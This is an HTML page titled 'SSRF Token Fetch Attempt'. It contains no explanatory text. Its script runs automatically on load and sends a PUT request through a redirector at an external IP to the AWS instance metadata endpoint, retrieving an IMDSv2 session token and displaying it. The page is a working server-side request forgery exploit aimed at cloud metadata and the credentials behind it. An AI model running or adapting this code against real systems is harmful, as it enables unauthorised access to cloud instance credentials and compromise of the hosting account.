<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>SSRF Token Leak</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
    h1 { color: #afa; }
    pre { background: #222; padding: 1em; border-radius: 5px; max-height: 500px; overflow-y: auto; }
  </style>
</head>
<body>
  <h1>SSRF Token Fetch Attempt</h1>
  <pre id="output">Loading...</pre>

  <script>
    (async () => {
      const output = document.getElementById("output");
      try {
        const res = await fetch("http://44.203.154.8/redir.php?url=http://169.254.169.254/latest/api/token", {
          method: "PUT",
          headers: {
            "X-aws-ec2-metadata-token-ttl-seconds": "21600"
          }
        });

        if (res.ok) {
          const token = await res.text();
          output.textContent = "Received IMDSv2 Token:\n\n" + token;
        } else {
          output.textContent = `Request failed: ${res.status} ${res.statusText}`;
        }
      } catch (e) {
        output.textContent = "Error: " + e.message;
      }
    })();
  </script>
</body>
</html>
